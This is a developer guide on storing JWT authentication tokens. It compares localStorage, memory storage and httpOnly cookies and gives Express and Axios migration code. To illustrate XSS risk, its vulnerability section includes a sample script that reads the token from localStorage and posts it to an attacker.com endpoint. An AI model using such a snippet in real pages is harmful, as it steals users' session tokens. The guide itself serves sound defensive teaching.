# JWT Token Storage Security Guide

## Overview

Your application uses **a single JWT (JSON Web Token)** for authentication. This token is currently stored in `localStorage`, which is the simplest approach but has security implications you should understand.

---

## Current Implementation

### How It Works

1. **User logs in** → API returns `{ user, token }`
2. **Token stored** in `localStorage` as `token`
3. **Automatic injection** - Axios interceptor adds token to all requests:
   ```typescript
   headers: { Authorization: `Bearer ${token}` }
   ```
4. **401 handling** - On token expiration/invalidity, user is redirected to login

### Files Involved
- `src/services/api/apiClient.ts` - Adds token to requests  
- `src/services/auth.service.ts` - Stores/retrieves token
- `src/utils/auth.utils.ts` - Helper functions
- `src/services/tokenStorage.ts` - Flexible storage strategies

---

## Security Comparison

| Feature | localStorage | Memory Storage | httpOnly Cookies |
|---------|-------------|----------------|------------------|
| **Persists on refresh** | ✅ Yes | ❌ No | ✅ Yes |
| **XSS protection** | ❌ Vulnerable | ✅ Protected | ✅ Protected |
| **CSRF protection** | ✅ Safe | ✅ Safe | ⚠️ Needs SameSite |
| **Implementation** | ✅ Simple | ✅ Simple | ⚠️ Backend changes |
| **Use case** | Development | High security SPAs | Production |

---

## Security Vulnerabilities

### localStorage (Current Approach)

**Vulnerability: XSS (Cross-Site Scripting)**

If an attacker injects malicious JavaScript into your application (e.g., through a vulnerable dependency or compromised CDN), they can steal the token:

```javascript
// Malicious script
const stolenToken = localStorage.getItem('token');
fetch('https://attacker.com/steal', { 
  method: 'POST', 
  body: stolenToken 
});
```

**Real-world attack vectors:**
- Compromised npm package
- Browser extension exploit
- Third-party script injection
- Input field XSS

**Mitigation (but not foolproof):**
- Sanitize all user inputs
- Use Content Security Policy (CSP) headers
- Regularly audit dependencies with `npm audit`
- Use trusted CDNs with SRI (Subresource Integrity)

⚠️ **Even with these protections, localStorage is still vulnerable if XSS occurs.**

---

## Recommended Alternatives

### Option 1: httpOnly Cookies (RECOMMENDED for Production)

#### Why It's More Secure
- Cookies with `httpOnly` flag **cannot be accessed by JavaScript**
- XSS attacks **cannot steal the token** even if they execute
- Token automatically sent with every request
- Built-in CSRF protection with `SameSite` attribute

#### Backend Changes Required

**1. Login endpoint sets cookie instead of returning token in body:**

```typescript
// BEFORE (current)
POST /api/auth/login
Response Body: 
{
  "user": {...},
  "token": "eyJhbGc..."
}

// AFTER (httpOnly cookies)
POST /api/auth/login
Response Body:
{
  "user": {...}
}
Response Headers:
Set-Cookie: token=eyJhbGc...; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

**Backend example (Node.js/Express):**

```javascript
// Login route
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Validate credentials
  const user = await authenticateUser(email, password);
  const token = generateJWT(user);
  
  // Set httpOnly cookie
  res.cookie('token', token, {
    httpOnly: true,      // Cannot be accessed by JavaScript
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 3600000,     // 1 hour
    path: '/',
  });
  
  // Return user data only (no token in body)
  res.json({ user });
});

// Logout route
app.post('/api/auth/logout', (req, res) => {
  res.clearCookie('token');
  res.json({ message: 'Logged out' });
});

// Middleware to verify token from cookie
app.use((req, res, next) => {
  const token = req.cookies.token;
  if (token) {
    try {
      req.user = verifyJWT(token);
    } catch (err) {
      return res.status(401).json({ message: 'Invalid token' });
    }
  }
  next();
});
```

**2. Frontend changes:**

Update `src/services/api/apiClient.ts`:

```typescript
const apiClient: AxiosInstance = axios.create({
  baseURL: BASE_URL,
  timeout: 30000,
  headers: {
    'Content-Type': 'application/json',
  },
  withCredentials: true, // ⭐ IMPORTANT: Send cookies with requests
});

// Remove request interceptor (no need to add Authorization header)
// Cookie is sent automatically

// Simplify response interceptor
apiClient.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401) {
      // Token expired/invalid, redirect to login
      window.location.href = '/auth/sign-in';
    }
    return Promise.reject(error);
  }
);
```

Update `src/services/auth.service.ts`:

```typescript
export const authService = {
  login: async (credentials: LoginRequest) => {
    const response = await apiService.post('/auth/login', credentials);
    // No token storage needed - cookie is set by server
    return response;
  },

  logout: async () => {
    await apiService.post('/auth/logout');
    // Cookie is cleared by server
  },

  getCurrentUser: async () => {
    // Cookie sent automatically
    return apiService.get('/auth/me');
  },

  isAuthenticated: async () => {
    // Check with server (can't check cookie from JS)
    try {
      await apiService.get('/auth/me');
      return true;
    } catch {
      return false;
    }
  },
};
```

---

### Option 2: Memory Storage (Better than localStorage)

#### Why It's Better
- Token stored in JavaScript memory (not localStorage)
- XSS attacks can only steal token during current session
- Token automatically cleared on page refresh (better security)

#### Drawbacks
- User must re-login after page refresh
- Not suitable for all applications

#### Implementation

Use the included `tokenStorage.ts`:

```typescript
// src/services/tokenStorage.ts
export const tokenStorage = new TokenStorage('memory'); // ⭐ Change here
```

Update `src/services/auth.service.ts`:

```typescript
import { tokenStorage } from './tokenStorage';

export const authService = {
  login: async (credentials: LoginRequest) => {
    const response = await apiService.post('/auth/login', credentials);
    
    if (response.data.token) {
      tokenStorage.setToken(response.data.token); // ⭐ Use memory storage
    }
    
    return response;
  },

  logout: async () => {
    await apiService.post('/auth/logout');
    tokenStorage.clear(); // ⭐ Clear from memory
  },

  getToken: () => tokenStorage.getToken(),
  
  isAuthenticated: () => tokenStorage.isAuthenticated(),
};
```

---

## Decision Matrix

### Choose localStorage if:
- ✅ You're in **development/testing**
- ✅ You want **quick implementation**
- ✅ You're **okay with XSS risk**
- ✅ You need **persistent sessions**

### Choose Memory Storage if:
- ✅ You want **better security than localStorage**
- ✅ You can **handle page refresh = logout**
- ✅ You don't want to **change backend**
- ✅ Your app is a **high-security SPA**

### Choose httpOnly Cookies if:
- ✅ You're in **production**
- ✅ You want **maximum security**
- ✅ You can **modify backend**
- ✅ You need **persistent sessions**

---

## Migration Checklist

### To httpOnly Cookies:

**Backend:**
- [ ] Update login endpoint to set `Set-Cookie` header
- [ ] Add `httpOnly`, `secure`, `sameSite` flags
- [ ] Update logout to clear cookie
- [ ] Add cookie-parsing middleware
- [ ] Update auth middleware to read from cookies

**Frontend:**
- [ ] Add `withCredentials: true` to axios config
- [ ] Remove token storage from auth.service.ts
- [ ] Remove Authorization header injection
- [ ] Update error handling (401 redirects)
- [ ] Test CORS configuration

**Testing:**
- [ ] Verify cookies are set on login
- [ ] Verify cookies are sent with requests
- [ ] Verify cookies are cleared on logout
- [ ] Test 401 handling
- [ ] Test CSRF protection

---

## Additional Security Best Practices

1. **Use HTTPS in production** - Required for `Secure` cookie flag
2. **Set short token expiration** - 15-60 minutes recommended
3. **Implement token blacklisting** - Invalidate tokens on logout
4. **Use strong JWT secrets** - Long, random, environment-specific
5. **Enable CORS properly** - Restrict to trusted origins
6. **Implement rate limiting** - Prevent brute force attacks
7. **Add CSP headers** - Prevent XSS
8. **Regular security audits** - `npm audit`, dependency scanning

---

## Summary

| Approach | Security | UX | Complexity |
|----------|----------|-----|-----------|
| **localStorage** | ⚠️ Low | ✅ Great | ✅ Easy |
| **Memory** | ✅ Medium | ⚠️ Good | ✅ Easy |
| **httpOnly Cookies** | ✅ High | ✅ Great | ⚠️ Moderate |

**Recommendation:**
- **Development:** Use localStorage (current implementation)
- **Production:** Migrate to httpOnly cookies
- **High-security SPA:** Consider memory storage

The `tokenStorage.ts` file provides a flexible implementation that lets you switch between all three approaches with a single line change!
